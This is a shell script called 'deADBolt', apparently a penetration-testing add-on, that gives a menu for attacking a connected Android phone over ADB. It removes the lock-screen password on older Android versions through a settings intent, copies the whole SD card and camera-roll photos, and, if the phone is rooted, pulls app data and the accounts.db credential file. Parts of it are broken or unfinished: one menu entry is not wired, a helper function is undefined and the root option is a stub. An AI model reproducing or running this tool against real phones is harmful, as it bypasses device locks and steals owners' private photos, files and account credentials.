#!/bin/sh


f_menu(){
	clear
	echo "deADBolt Menu"
	echo ""
	echo "[1] Acquire Root"
	echo "[2] Remove Password Protection"
	echo "[3] Pull All Data from SDcard"
	echo "[4] Pull Camera Roll Photos"
	echo "[5] Pull Account Data"
	echo ""
	echo "[Q] Quit"
	echo ""
	read -p "Selection: " selection

	case $selection in
		1) f_towelroot; f_menu;;
		2) f_removelocks; f_menu;;
		3) f_pullallsd; f_menu;;
		4) f_cameraroll; f_menu;;
		q) clear; exit;;
		*) f_menu;;
	esac
	clear
}

###############
###Towelroot###
###############
f_towelroot(){
	read -p "Not Complete. Press [Enter] to continue."
}

################################
###Remove Password Protection###
################################
f_removelocks(){
	clear
	echo "This will remove the password protection on pre-KitKat ROMs."
	echo ""
	read -p "Press [Enter] to return to main menu." null
	clear
	echo "To continue, plug in the device and ensure ADB is enabled."
	adb wait-for-device
	clear
	echo "Removing password protection..."
	adb shell am start -n com.android.settings/com.android.settings.ChooseLockGeneric --ez confirm_credentials false --ei lockscreen.password_type 0 --activity-clear-task
	clear
	echo "Removed password. If it was unsuccessful, your device is not supported."
	echo ""
	read -p "Press [Enter] to return to main menu." null
	clear
}

##########################
###Pull All From SDcard###
##########################
f_pullallsd(){
	clear
	echo "To continue, plug in the device and ensure ADB is enabled"
	adb wait-for-device
	clear
	echo "Pulling data..."
	echo ""
	date=$(date +%m%d%Y-%H.%M.%S)
	adb pull /sdcard/ /sdcard/deADBolt/sd-pull/SDcard-$date
	clear
	echo "SD card pull complete. You can find the data in '/sdcard/deADBolt/sd-pull/SDcard-$date'."
	echo ""
	read -p "Press [Enter] to return to main menu." null
	clear
}

###################
###Pull App Data###
###################
f_appdata(){
	clear
	echo "To continue, plug in the device and ensure ADB is enabled"
	adb wait-for-device
	clear
	echo "Attempting to gain root. There may be a superuser prompt on the device's screen."
	$adb push /sdcard/kali-nh/deADBolt/files/busybox-static /data/local/tmp/busybox
	$adb shell "chmod a+x /data/local/tmp/busybox"
	rooted=$(isRoot noinfo)
	if [ "$rooted" = "1" ]
		then
			clear
			echo "Device is rooted. Retrieving app data."
			date=$(date +%m%d%Y-%H.%M.%S)
			adb shell "su -c "mount -o rw,remount /dev/block/mmcblk0p1 /system""
			adb pull /data/data/ /sdcard/deADBolt/data-pull/data-$date
			clear
			echo "Data pull complete. You can find the data in '/sdcard/deADBolt/data-pull/data-$date'"
			echo ""
			read -p "Press [Enter] to return to main menu." null
		else
			clear
			echo "Device is not rooted, or the autorization prompt was not accepted."
			echo ""
			read -p "Press [Enter] to return to main menu." null
			clear
	fi
}

#############################
###Pull Camera Roll Photos###
#############################
f_cameraroll(){
	clear
	echo "To continue, plug in the device and ensure ADB is enabled"
	adb wait-for-device
	clear
	date=$(date +%m%d%Y-%H.%M.%S)
	adb pull /sdcard/DCIM/ /sdcard/deADBolt/photo-pull/photos-$date/DCIM
	adb pull /sdcard/Pictures/ /sdcard/deADBolt/photo-pull/photos-$date/Pictures
	clear
	echo "Photo pull complete. You can find the data in '/sdcard/deADBolt/photo-pull/photos-$date'"
	echo ""
	read -p "Press [Enter] to return to main menu." null
	clear
}

######################
###Get Account Data###
######################
f_accountdata(){
	clear
	echo "To continue, plug in the device and ensure ADB is enabled"
	adb wait-for-device
	clear
	echo "Attempting to gain root. There may be a superuser prompt on the device's screen."
	$adb push /sdcard/kali-nh/deADBolt/files/busybox-static /data/local/tmp/busybox
	$adb shell "chmod a+x /data/local/tmp/busybox"
	rooted=$(isRoot noinfo)
	if [ "$rooted" = "1" ]
		then
			clear
			echo "Device is rooted. Retrieving accounts.db"
			date=$(date +%m%d%Y-%H.%M.%S)
			adb shell "su -c "mount -o rw,remount /dev/block/mmcblk0p1 /system""
			adb pull /data/system/users/0/accounts.db /sdcard/deADBolt/account-pull/accounts-$date/accounts.db
			clear
			echo "Accounts.db pull complete. You can find the data in '/sdcard/deADBolt/account-pull/accounts-$date'"
			echo ""
			read -p "Press [Enter] to return to main menu." null
		else
			clear
			echo "Device is not rooted, or the autorization prompt was not accepted."
			echo ""
			read -p "Press [Enter] to return to main menu." null
			clear
	fi
}

f_menu
